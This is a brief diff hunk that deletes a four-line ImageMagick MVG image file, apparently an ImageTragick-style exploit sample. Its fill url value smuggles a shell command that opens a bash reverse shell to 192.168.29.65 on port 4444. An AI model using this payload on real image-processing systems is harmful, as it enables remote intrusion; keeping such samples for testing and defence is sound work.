@@ -1,4 +1,0 @@
-push graphic-content
-viewbox 0 0 640 480
-fill 'url(http://example.com" | bash -c "bash -i >& /dev/tcp/192.168.29.65/4444 0>&1" | " )'
-pop graphic-context
